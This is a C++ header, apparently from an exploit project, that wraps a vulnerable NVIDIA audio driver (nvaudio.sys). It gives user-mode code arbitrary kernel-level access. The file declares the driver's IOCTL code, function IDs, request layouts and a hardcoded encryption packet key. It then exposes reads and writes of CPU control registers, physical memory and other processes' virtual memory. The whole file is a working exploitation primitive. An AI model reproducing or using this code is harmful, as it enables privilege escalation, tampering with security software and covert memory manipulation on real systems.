#pragma once
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

class NVDrv
{

public:
    /*
    *	IO call to driver for __readcrX() intrinsic where X = (int cr)
    */
    DWORD                   ReadCr(int cr);

    /*
    *	IO call to driver for __writecrX(value) intrinsic where X = (int cr)
    */
    BOOL                    WriteCr(int cr, DWORD64 value);

    /*
    *	Gets the file path of a running process by name
    */
    std::wstring            GetProcessPath(const std::wstring& processName);

    /*
    *	Returns the base address of a running process by name
    */
    uintptr_t               GetProcessBase(const std::wstring& processName);


    /*
    *	Bruteforcing to get the directory base of a process with it's base address
    */
    uintptr_t               GetProcessCR3(uintptr_t base_address);

    /*
    *	Get system directory base by walking PROCESSOR_START_BLOCK
    */
    uintptr_t               GetSystemCR3();

    /*
    *	IO call to driver for MmGetPhysicalAddress
    */
    uintptr_t               MmGetPhysicalAddress(uintptr_t virtual_address);


    /*
    *	Translates linear/virtual addresses to physical addresses with rightful directory base
    */
    uintptr_t               TranslateLinearToPhysicalAddress(uintptr_t virtual_address);


    /*
    *	IO call to driver for physical memory memcpy read via MmMapIoSpace
    */
    BOOL                    ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size);

    /*
    *	IO call to driver for physical memory memcpy write via MmMapIoSpace
    */
    BOOL                    WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size);

    /*
    *	Read virtual memory via translating virtual addresses to physical addresses
    */
    BOOL                    ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size);

    /*
    *	Write virtual memory via translating virtual addresses to physical addresses
    */
    BOOL                    WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size);

    /*
    *	Swap reading context for TranslateLinearToPhysicalAddress
    */
    BOOL                    SwapReadContext(uintptr_t target_cr3);

    NVDrv()
    {
        /*
        *	Import the vulnerable driver into memory
        */

        HMODULE nvaudio = LoadLibraryW(L"C:\\nvaudio.sys");

        if (!nvaudio)
        {
            printf("nvaudio.sys not found at C: directory!\n");
            exit(5000);
        }


        /*
        *	Get the payload encryption function sub_2130
        */

        encrypt_payload = (decltype(encrypt_payload))(__int64(nvaudio) + 0x2130);



        /*
        *	Open a handle to the driver
        */

        this->nvhandle = CreateFileW(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);

        if (this->nvhandle != INVALID_HANDLE_VALUE) {
            printf("NVR0Internal Handle: %p\n", this->nvhandle);
        }
        else {
            printf("Driver is not loaded!\n");
            exit(5000);
        }
    }


    /*
    *	Read template for ReadVirtualMemory()
    */
    template<typename T>
    T Read(uintptr_t address)
    {
        T buffer;

        if (!ReadVirtualMemory(address, &buffer, sizeof(T)))
            return NULL;

        return buffer;
    }

    /*
    *	Write template for WriteVirtualMemory()
    */
    template<typename T>
    BOOL Write(uintptr_t address, T val)
    {
        if (!WriteVirtualMemory(address, (LPVOID)&val, sizeof(T)))
            return FALSE;

        return TRUE;

    }

    enum NVControlRegisters {
        CR0 = 0,
        CR2 = 2,
        CR3 = 3,
        CR4 = 4
    };

private:
#define DEBUG TRUE
    static int constexpr ioctl_code = 0x9C40A484;

    enum class NVFunction : int
    {
        read_cr = 0,
        write_cr = 1,
        phys_req = 0x26,
        phys_read = 0x14,
        phys_write = 0x15
    };

    struct request { };

    struct request_memcpy : request
    {
        NVFunction request_id;
        int size;
        __int64 dst_addr;
        __int64 src_addr;
        char unk[0x20];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_phys_addr : request
    {
        NVFunction request_id;
        int unk_0;
        __int64 result_addr;
        __int64 virtual_addr;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };
    
    struct request_readcr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int result;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8] = { 12868886329971960498, 13552922889676271240, 10838534925730813900, 11819403095038824665,16047435637536096 ,10679697536739367056 ,18271467892729589711 ,6472933704646412218 };;
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_writecr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    void* (*encrypt_payload)(request* data_crypt, int, void* temp_buf) = nullptr;
    HANDLE nvhandle = INVALID_HANDLE_VALUE;
    uintptr_t target_cr3 = 0;
};
